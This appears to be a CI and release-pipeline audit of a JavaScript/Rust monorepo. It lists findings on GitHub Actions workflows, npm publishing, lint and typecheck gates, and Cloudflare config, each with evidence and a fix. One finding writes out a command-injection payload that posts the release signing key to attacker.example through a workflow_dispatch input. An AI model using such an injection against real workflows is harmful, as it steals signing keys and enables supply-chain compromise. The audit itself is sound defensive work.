title: postinstall nuxt-content patch is dead code: resolve always throws ERR_PACKAGE_PATH_NOT_EXPORTED
summary: The root `postinstall` runs this patch to serialize @nuxt/content dev-cache writes, but it resolves the package via `@nuxt/content/package.json`, a subpath the package's `exports` map does not expose. The require.resolve always throws and the catch block exits 0, so the patch has never been applied.
failure_scenario: Reproduced at HEAD: createRequire(<script url>).resolve('@nuxt/content/package.json') throws ERR_PACKAGE_PATH_NOT_EXPORTED, so `pnpm install` silently skips the patch. The concurrency bug the patch documents ("Concurrent better-sqlite3 writes on the shared development cache can hang or throw 'readonly database'") is still live in every `nexus:dev` run, and the script prints nothing to say so.
recommendation: Resolve via `require.resolve('@nuxt/content')` and derive dist/module.mjs from it, and fail loudly (non-zero or a warning annotation) when the target block is not found.

title: workflow_dispatch inputs interpolated into a run: block that holds the release signing key
summary: The Collect Release Assets step interpolates unvalidated `github.event.inputs.rollback_evidence` and `rollback_evidence_signature` directly into bash. The same step has RELEASE_SIGNING_PRIVATE_KEY in its env and writes it to disk, so injected shell runs with the release signing key available.
evidence:
ROLLBACK_EVIDENCE="${{ github.event_name == 'workflow_dispatch' && github.event.inputs.rollback_evidence || '' }}"
ROLLBACK_EVIDENCE_SIGNATURE="${{ github.event_name == 'workflow_dispatch' && github.event.inputs.rollback_evidence_signature || '' }}"
failure_scenario: An actor who can run the workflow dispatches it with rollback_evidence set to `$(curl -X POST -d @$RUNNER_TEMP/tuff-release-signing-private.pem https://attacker.example)`. GitHub substitutes the string before bash parses the line, command substitution executes inside double quotes, and the decoded PEM at signing_key_path (line 1124-1131) is exfiltrated. Unlike sync_tag and recover_run_id (regex-validated at lines 851-858), these two inputs are never validated.
recommendation: Pass the inputs through `env:` and reference them as $ROLLBACK_EVIDENCE, and reject values that are not repo-relative paths matching a strict allowlist.

title: TUFF_ENCRYPTION_KEY secret is interpolated into a shell test instead of passed via env
summary: The Set Build Environment Variables step splices the raw secret value into the shell source of a `run:` block to test whether it is set. The secret becomes part of the command text rather than an environment value.
evidence:
if [ -n "${{ secrets.TUFF_ENCRYPTION_KEY }}" ]; then
  echo "TUFF_ENCRYPTION_KEY is set (official build)"
failure_scenario: If the secret ever contains a double quote or `$(`/backtick sequence, the expanded line is either a bash syntax error that fails every release build on all three runners, or a command substitution that executes attacker/operator-supplied text. Log masking does not protect against this because the value is evaluated by bash, not printed.
recommendation: Add `env: TUFF_ENCRYPTION_KEY: ${{ secrets.TUFF_ENCRYPTION_KEY }}` to the step and test `[ -n "${TUFF_ENCRYPTION_KEY}" ]`.

title: Cloudflare Access client secret is read from repository vars before secrets
summary: The Nexus sync job prefers `vars.ADMIN_CF_ACCESS_CLIENT_SECRET` over `secrets.ADMIN_CF_ACCESS_CLIENT_SECRET`. Repository/organization variables are plaintext configuration: they are readable in the UI/API and are never masked in Actions logs.
evidence:
NEXUS_CF_ACCESS_CLIENT_ID: ${{ vars.ADMIN_CF_ACCESS_CLIENT_ID || secrets.ADMIN_CF_ACCESS_CLIENT_ID }}
NEXUS_CF_ACCESS_CLIENT_SECRET: ${{ vars.ADMIN_CF_ACCESS_CLIENT_SECRET || secrets.ADMIN_CF_ACCESS_CLIENT_SECRET }}
failure_scenario: If an operator follows the first branch of the expression and stores the CF Access service-token secret as a variable, it is exposed to anyone with read access to repo settings, and any step that echoes the header (e.g. `curl -v`) prints it unredacted into a publicly readable release log, granting standing access behind Cloudflare Access to the Nexus admin API.
recommendation: Read the client secret only from `secrets.`; keep `vars.` for the non-sensitive client id if needed.

title: Tuffex CI disables lint, test and typecheck although all three scripts exist
summary: The tuffex package CI calls the reusable workflow with lint/test/typecheck all false and inline comments claiming the scripts do not exist. packages/tuffex/package.json defines `lint`, `test` and `typecheck`. The only gate that runs for the component library is `pnpm build`.
evidence:
run-typecheck: false # Add if typecheck script exists
      run-lint: false # Add if lint script exists
      run-test: false # Add if test script exists
      run-build: true

# packages/tuffex/package.json scripts: build, build:vite, dev, lint, lint:fix, test, typecheck, audit:exports, audit:types, audit:size
failure_scenario: A PR that breaks a tuffex unit test or introduces a vue-tsc type error passes CI as long as the Vite build emits output; the failure only surfaces later in apps/core-app's `typecheck:web`, which builds tuffex from source, or after release.
recommendation: Flip run-lint/run-test/run-typecheck to true for tuffex and delete the stale comments.

title: native-protocol workflow's push trigger targets `main`, but the default branch is `master`
summary: Every other workflow lists both `main` and `master`; this one lists only `main` on the push side. The repository default branch is `master` (origin/HEAD -> origin/master), so the post-merge Rust gate never executes.
evidence:
push:
    branches:
      - main
    paths:
      - '.github/workflows/native-protocol.yml'
      - 'apps/core-app/src/main/modules/native-capabilities/**'
failure_scenario: A Rust change merged to master runs no cargo fmt/clippy/test and no packed-package check on master itself. If the PR run was stale or was merged with an out-of-date base, a clippy-denied warning or a broken N-API protocol lands on the release branch undetected, and the next tagged build is the first thing to fail.
recommendation: Add `master` to the push branch list (or replace both with the default branch).

title: PR quality gate runs a hardcoded six-file test subset, so new tests never run in CI
summary: ci.yml's PR Quality job runs `pnpm quality:pr`, whose only test step is `test:targeted` — an explicit list of six test files across utils, core-app and nexus. No workflow runs the full vitest suites for apps/core-app, packages/utils or apps/nexus.
evidence:
"test:targeted": "corepack pnpm -C \"packages/utils\" exec vitest run \"__tests__/plugin-sdk-lifecycle.test.ts\" \"__tests__/transport-domain-sdks.test.ts\" \"__tests__/transport/port-policy.test.ts\" && corepack pnpm -C \"apps/core-app\" exec vitest run \"src/renderer/src/modules/auth/sync-preferences.test.ts\" \"src/main/modules/plugin/plugin-loaders.test.ts\" \"src/main/channel/common.test.ts\" && corepack pnpm -C \"apps/nexus\" exec vitest run \"test/api/sync/sync-routes-410.test.ts\"",
"quality:pr": "corepack pnpm release:notes:verify && corepack pnpm lint:changed && corepack pnpm test:targeted && corepack pnpm -C \"apps/core-app\" run typecheck"
failure_scenario: A PR adds src/main/modules/box-tool/foo.test.ts and breaks an existing suite in the same area. CI is green because neither the new test nor the broken one is in the six-file list; the regression is only found when someone runs vitest locally.
recommendation: Run the affected packages' full suites (or a changed-file-derived selection) in the PR gate and keep test:targeted only as a fast local loop.

title: No cargo ecosystem in dependabot despite a shipped Rust workspace with a tracked Cargo.lock
summary: dependabot.yml configures only npm and github-actions. packages/tuff-native is a five-member Cargo workspace with a tracked Cargo.lock whose addons (OCR, screenshot, audio, Everything) are compiled into the shipped Electron app and gated by native-protocol.yml.
evidence:
- package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    open-pull-requests-limit: 5

# packages/tuff-native/Cargo.toml members = ["native-core", "native-napi", "native-screenshot", "native-audio", "fixtures/native-protocol-addon"]
failure_scenario: A RUSTSEC advisory against a crate pinned in packages/tuff-native/Cargo.lock produces no PR and no alert from this config, so the vulnerable crate keeps shipping inside the signed desktop app until someone bumps it by hand.
recommendation: Add a `package-ecosystem: cargo` entry with `directory: /packages/tuff-native`.

title: Third-party actions are pinned to mutable tags and a moving branch (dtolnay/rust-toolchain@stable)
summary: Every third-party action in the release-capable workflows is referenced by a mutable ref. dtolnay/rust-toolchain@stable is a branch, not even a tag, and the same workflows/jobs carry NPM_TOKEN, NEXUS_API_KEY, RELEASE_SIGNING_PRIVATE_KEY and Apple notarization credentials.
evidence:
- name: Setup Rust
        uses: dtolnay/rust-toolchain@stable

# same pattern elsewhere: softprops/action-gh-release@v3, release-drafter/release-drafter@v7, dorny/paths-filter@v4, jdx/mise-action@v4, Swatinem/rust-cache@v2, pnpm/action-setup@v6
failure_scenario: If any of these upstream repos is compromised, the attacker force-pushes the branch or moves the major tag and the next run of build-and-release.yml or package-tuff-cli-publish.yml executes their code in a job that already holds the npm publish token and the release signing private key. Nothing in the repo pins a commit, so the change is invisible in the diff.
recommendation: Pin third-party actions to full commit SHAs with a version comment, and let the existing dependabot github-actions updater bump them.

title: lint:changed misses untracked files outside CI, so new files skip the pre-PR lint loop
summary: When GITHUB_BASE_REF is unset (any local run of `pnpm lint:changed` or `pnpm quality:pr`), the script diffs against HEAD, which only reports tracked modifications. Files added but not yet `git add`ed are invisible to it.
failure_scenario: A developer writes a new module, runs `pnpm quality:pr` locally, sees `[lint:changed] OK: no changed JS/TS/Vue files.` and pushes. The file is only linted once it is committed and the PR job re-runs with GITHUB_BASE_REF set, turning a local pass into a CI failure.
recommendation: Union the diff with `git ls-files --others --exclude-standard` when no base ref is available.

title: noImplicitAny is off for both Electron main and renderer despite strict: true
summary: Both core-app tsconfigs re-declare `strict: true` but inherit @electron-toolkit/tsconfig, whose base explicitly sets `noImplicitAny: false`. Since an explicit flag beats the `strict` family default, every untyped parameter in main, preload and renderer is silently `any`.
failure_scenario: `function handle(payload) { return payload.tuffQuery }` type-checks clean in both `typecheck:node` and `typecheck:web`; a renamed field on the caller side is not caught, and the mistake reaches runtime with no compile error.
recommendation: Set `noImplicitAny: true` in both apps/core-app tsconfigs (fix the fallout incrementally with per-file suppressions if needed).

title: prepare script uses deprecated `husky install` (husky 9.1.7 prints DEPRECATED)
summary: The root prepare script still calls the pre-v9 `husky install` form. The installed husky 9.1.7 prints a DEPRECATED banner and continues; the sibling deprecated verbs already exit 1, and `install` is scheduled for the same treatment.
failure_scenario: When husky reaches v10 and `install` joins the exit-1 list, `pnpm install` fails at the prepare step for every contributor and in every CI job that installs dependencies — or, if the command is made a silent no-op instead, commit-msg and pre-commit hooks stop being installed without any error.
recommendation: Change the prepare script to `husky`.

title: Release workflow never checks that the pushed tag matches the built package version
summary: The release manifest, GitHub release name and rollback contract all derive the version from the git tag, while every artifact filename and latest.yml come from apps/core-app/package.json. No step in build-and-release.yml compares the two.
evidence:
node scripts/prepare-release-assets.mjs \
  --tag "${TAG}" \

# scripts/prepare-release-assets.mjs
const version = getReleaseVersion(tag)   // strips leading v from the tag only

# the sole package.json read in the workflow is the Windows-only assertion at line 653-654, which compares the installer to package.json, never to the tag
failure_scenario: Someone tags v2.5.0 while package.json still says 2.4.14-beta.2 (the current root version). The build succeeds, the Windows assertion passes because installer and latest.yml both say 2.4.14-beta.2, and the release is published as v2.5.0 / prerelease=false with a manifest claiming version 2.5.0 while shipping 2.4.14-beta.2 binaries. `release:notes:verify` does perform exactly this tag-vs-version check but is only wired into the PR gate, not into the release.
recommendation: Run `node scripts/release-notes-gateway.mjs verify --tag "$TAG"` (or an equivalent assertion) as the first step of the build job.

title: @talex-touch/utils is published with raw `npm publish`, skipping the manifest protocol gate
summary: Every other package publishes through scripts/publish-package.mjs, which runs validate-publish-manifests.mjs --pack and rejects catalog:/workspace:/file:/link: specs in the packed manifest. The utils workflow calls `npm publish` directly, and `publish:check` is not run by any workflow.
evidence:
npm publish --access public --tag "${dist_tag}" >"${publish_log}" 2>&1

# scripts/package-publish.config.mjs
export const packedForbiddenProtocols = ['catalog:', 'workspace:', 'file:', 'link:']
# scripts/publish-package.mjs:197
run(`node scripts/validate-publish-manifests.mjs --filter "${packageInfo.name}" --pack`)
failure_scenario: Adding an intra-repo dependency to packages/utils in the normal monorepo way (`"@talex-touch/tuff-core": "workspace:*"` or a `catalog:` entry) publishes that literal spec to the registry, because npm — unlike pnpm publish — does not rewrite workspace protocols. Every external consumer's install then fails with EUNSUPPORTEDPROTOCOL, and the bad version cannot be unpublished after 72h.
recommendation: Publish utils through `node scripts/publish-package.mjs --filter "@talex-touch/utils"` like the other packages, and add `publish:check` to the PR gate.

title: apps/nexus has no CI workflow: build, lint, typecheck, test and check:* gates never run
summary: apps/nexus is the production Cloudflare deployment (wrangler.toml binds prod D1, R2 and KV), and its package.json defines build, lint, typecheck, test, check:api-routes, check:mdc-fences, check:preview-secrets and check:runtime-evidence. No workflow invokes any of them; the only nexus code CI touches is one vitest file inside test:targeted and server/utils/** via the intelligence gate.
evidence:
- name: Run PR quality gate
        run: pnpm quality:pr

# apps/nexus scripts: build, check:api-routes, check:mdc-fences, check:preview-secrets, check:runtime-evidence, ..., lint, typecheck, test
# grep over .github/workflows: no job runs any of them
failure_scenario: A PR that breaks the Nuxt build, a nexus type error, or a leaked preview secret that `check:preview-secrets` is designed to catch merges green. The failure first appears in the Cloudflare Pages build after merge, i.e. directly against the production project, with no pre-merge signal.
recommendation: Add a nexus workflow (paths-filtered on apps/nexus/**) that runs typecheck, lint, test, the check:* gates and build.

title: typecheck:all is never run in CI; only apps/core-app is type-checked
summary: The PR gate ends with `pnpm -C "apps/core-app" run typecheck`. The workspace-wide `typecheck:all` script exists but no workflow calls it, so tuff-cli, tuff-cli-core, tuff-core, tuff-intelligence, intelligence-uikit, tuff-business and nexus are never type-checked by CI.
evidence:
"typecheck:all": "pnpm -F @talex-touch/unplugin-export-plugin run build && pnpm -F @talex-touch/tuffex run build && pnpm -r --if-present --filter '!@talex-touch/tuffex' run typecheck",

# quality:pr ends with: corepack pnpm -C "apps/core-app" run typecheck
failure_scenario: A breaking type change in packages/utils that only affects packages/tuff-cli compiles fine in the PR gate and is caught only when the CLI publish workflow runs `pnpm --filter @talex-touch/tuff-cli run build` on master — after merge, in the job that publishes to npm.
recommendation: Run typecheck:all in a scheduled or paths-filtered CI job, or extend the PR gate to the packages a change touches.

title: plugins:validate is wired into no workflow, so plugin manifests are never gated
summary: scripts/validate-plugins.mjs checks manifest.json validity, entry-point syntax, permission IDs and searchProvider/permission consistency across all 25 plugin directories, and exits 1 on errors. Neither it nor validate-plugin-package-policy.ts runs in any GitHub workflow.
evidence:
"plugins:validate": "tsx scripts/validate-plugin-package-policy.ts && node scripts/validate-plugins.mjs",

# scripts/validate-plugins.mjs:272
if (hasErrors) {
  console.error('\x1B[31mValidation failed with errors.\x1B[0m\n')
  process.exit(1)

# grep 'plugins:validate' over .github/workflows: no match
failure_scenario: A PR lands a manifest.json with a syntax error in its Prelude, an unknown permission id, or a searchProvider whose permissionScopes are not backed by declared permissions. CI is green; the plugin fails to load only at runtime in the packaged app, where these plugins are bundled as built-ins.
recommendation: Add `pnpm plugins:validate` to the PR quality gate, paths-filtered on plugins/**.

title: privacy:inventory:verify (sensitive-data inventory gate) never runs in CI
summary: scripts/verify-sensitive-data-inventory.mjs is a 16KB deterministic verifier wired to a package script, but no workflow invokes it, so the sensitive-data inventory it guards can drift from the code without any CI signal.
evidence:
"privacy:inventory:verify": "node scripts/verify-sensitive-data-inventory.mjs",

# grep 'privacy:inventory' over .github/workflows: no match
failure_scenario: A change that starts collecting or transmitting a new class of user data without registering it in the inventory merges unnoticed; the drift is only discovered if a maintainer remembers to run the script by hand before a release.
recommendation: Run it in the PR gate (or at minimum in a release-readiness workflow) so inventory drift blocks the merge.

title: Secret-named keys are declared as plaintext wrangler vars, overwriting Worker secrets on deploy
summary: [env.production.vars] declares RESEND_API_KEY (and preview declares GITHUB_CLIENT_ID, LINUXDO_CLIENT_ID, ADMIN_CF_ACCESS_CLIENT_ID, ADMIN_OOB_MTLS_FINGERPRINTS) as empty plaintext vars. Vars and secrets share one binding namespace, and vars in the config file are re-applied on every deploy.
evidence:
[env.production.vars]
NODE_OPTIONS = "--max-old-space-size=6144"
AUTH_ORIGIN = "https://tuff.tagzxia.com"
AUTH_EMAIL_FROM = "tuff@tagzxia.com"
LINUXDO_ISSUER = "https://connect.linux.do"
RESEND_API_KEY = ""
failure_scenario: An operator sets RESEND_API_KEY with `wrangler secret put` so transactional mail works; the next production deploy re-uploads the empty string from this file over the binding and email silently starts failing with an empty API key. The same pattern also invites a real key to be committed here in plaintext.
recommendation: Delete secret-valued keys from [vars] and manage them exclusively as secrets; keep only genuinely public configuration in the config file.

title: check-release-gates defaults to a hardcoded tag v2.4.7 when --tag is omitted
summary: The release-gate CLI falls back to the literal tag v2.4.7 (and derives --version from it) instead of reading the repository version or failing. The root package is currently 2.4.14-beta.2.
evidence:
const tag = getArgValue(argv, '--tag', 'v2.4.7')
const version = getArgValue(argv, '--version', tag.replace(/^v/, ''))
failure_scenario: An operator runs `node scripts/check-release-gates.mjs --strict` during a release. The notes check validates notes/update_2.4.7.*.md, the manifest and version-baseline checks target 2.4.7, and the summary JSON reports pass for a release that shipped two years of versions later — a gate that reports success about the wrong artifact.
recommendation: Default the tag to `v${rootPackageVersion}` or require --tag explicitly.

title: check-release-gates exits 0 on failed checks unless --strict is passed
summary: The aggregated result is printed as JSON, but the process only exits non-zero when the caller remembers `--strict`. A `fail` result without that flag is indistinguishable from success to any shell or CI step.
failure_scenario: A release runbook step or future workflow invokes the gate without --strict; failed manifest validation and violated release-notes contracts print into the log and the step reports success, so the release proceeds on a gate that actually failed.
recommendation: Exit non-zero on `fail` by default and keep a `--no-strict`/report-only opt-out for exploratory runs.

title: First release in a channel cannot publish: rollback resolver throws with no predecessor
summary: resolveSameChannelRollbackVersion throws when no earlier tag exists in the same channel. Both the create-release and sync-nexus-release jobs call it under `set -euo pipefail`, so the throw fails the whole release.
evidence:
const previous = candidates[0]
  if (!previous)
    throw new Error(`No same-channel predecessor exists for ${tag}`)

# .github/workflows/build-and-release.yml:1038-1041
set -euo pipefail
rollback=$(node scripts/resolve-update-rollback-version.mjs --tag ... --remote origin)
failure_scenario: The first tag pushed in a channel that has no history (for example the first snapshot tag, or the first stable tag if only beta tags exist) fails the Resolve same-channel rollback version step after all three platform builds have already completed, with no way to proceed short of editing the workflow.
recommendation: Emit an explicit null rollbackFromVersion for a channel's first release and let the manifest contract handle the empty case.

title: Published-manifest verification silently passes when the npm view call fails
summary: verifyRegistryManifest is the post-publish check that the registry copy contains no catalog:/workspace:/file:/link: specs. Its catch block rethrows only its own error message; any failure of the `npm view` command itself is swallowed and the check reports success.
failure_scenario: A registry hiccup, rate limit, proxy error or auth failure makes `npm view <pkg>@<version> dependencies --json` exit non-zero. The loop swallows it for all three dependency fields and publish-package.mjs exits 0, reporting a verified publish while nothing was actually verified.
recommendation: Distinguish command failure from a clean empty result and fail the publish when the manifest cannot be read.

title: The only lint gate in CI drops --max-warnings, so every ESLint warning is unenforced
summary: CI lints exclusively through `quality:pr` -> `lint:changed` -> run-eslint-changed.mjs, whose eslint argv has no --max-warnings. The root `pnpm lint` does pass --max-warnings=0 but is never invoked by any workflow, and apps/core-app's own lint script passes --quiet, which discards warnings outright.
evidence:
const args = [
    'pnpm',
    '-C',
    workspace,
    'exec',
    'eslint',
    '--cache',
    '--no-warn-ignored',
    ...files,
  ]

# package.json root lint: eslint --cache --max-warnings=0 --no-warn-ignored ...
# apps/core-app package.json: "lint": "eslint --cache . --quiet"
failure_scenario: apps/core-app/eslint.config.mjs sets `@typescript-eslint/no-explicit-any: 'warn'` and `@typescript-eslint/no-unused-vars: ['warn', ...]`. A PR adding explicit `any` types and unused variables produces warnings that CI prints and then passes, so these rules are decorative: no configured warning can ever fail a build.
recommendation: Add --max-warnings=0 to the argv in lintWorkspace/lintRoot and drop --quiet from the core-app lint script so local and CI enforcement agree.

title: pnpm lint and lint-staged never cover plugins/touch-dictation
summary: `pnpm lint` reaches plugin code two ways: `--filter "./plugins/*"` (workspace packages, requires package.json) and a hardcoded brace list for the package.json-less plugin directories. touch-dictation is in neither, and lint-staged has entries only for touch-image, touch-music and touch-translation.
evidence:
"plugins/{touch-window-manager,touch-window-presets,touch-dev-toolbox,touch-batch-rename,touch-browser-bookmarks,touch-browser-open,touch-system-actions,touch-text-snippets,touch-snipaste,touch-quick-actions,touch-code-snippets}/**/*.{js,jsx,ts,tsx,vue,mjs,cjs,cts,mts}"

# plugins/touch-dictation has no package.json and is absent from this list; plugins/touch-dictation/index.js exists
failure_scenario: Full-repo lint runs and pre-commit lint-staged both report clean while plugins/touch-dictation/index.js (the Prelude the app loads) is never checked. Only the changed-file path (run-eslint-changed.mjs, which falls back to a root-cwd eslint run) sees it, so a lint error introduced by a non-PR path such as a direct push or a bulk refactor stays invisible. Every future package.json-less plugin repeats the omission, because the list is maintained by hand.
recommendation: Enumerate plugin directories from the filesystem instead of hardcoding them, or give each plugin a package.json so `./plugins/*` covers it.

title: utils and tuffex publish workflows crash when github.event.before is not a reachable commit
summary: Both workflows run `git show "$before_sha:<pkg>/package.json"` under `set -e`. The sibling CLI publish workflow guards the same call with `git cat-file -e`; these two do not.
evidence:
previous_version=$(git show "${before_sha}:packages/utils/package.json" | node -e "...")

# .github/workflows/package-tuff-cli-publish.yml:89-92 has the guard the others lack
            if ! git cat-file -e "${sha}^{commit}" >/dev/null 2>&1; then
              echo ""
              return 0
            fi
failure_scenario: After a force-push to master (or a branch rewrite that orphans the previous head), `github.event.before` points at a commit that is not reachable in the fetched history. `git show` exits non-zero, pipefail propagates it, and the publish workflow fails at the version check — so a genuine version bump in that same push is never published, with a git error as the only clue.
recommendation: Reuse the `git cat-file -e` guard from package-tuff-cli-publish.yml in both workflows and treat an unreachable before_sha as 'no previous version'.

title: npm publish workflows have no concurrency group, so two pushes race on the same version
summary: None of the four publish workflows declares `concurrency`, unlike ci.yml, intelligence.yml and native-protocol.yml. Two pushes to master in quick succession start two publish jobs that both pass the `npm view` existence check and then both call publish.
evidence:
jobs:
  publish:
    name: Publish - utils
    runs-on: ubuntu-latest

# and the workaround this race already required:
          if grep -Eqi 'previously published versions|cannot publish over the previously published version' "${publish_log}"; then
            if npm view "@talex-touch/utils@${version}" version >/dev/null 2>&1; then
              echo "... became available during publish. Treating duplicate publish as success."
failure_scenario: Two commits land seconds apart. Both runs read the same version, both find it absent from npm, both build and publish; one wins and the other has to be rescued by the duplicate-publish string match quoted above. That fallback matches on npm's English error text, so an npm message change turns the race into a red publish job on master.
recommendation: Add `concurrency: { group: publish-<pkg>, cancel-in-progress: false }` to each publish workflow.
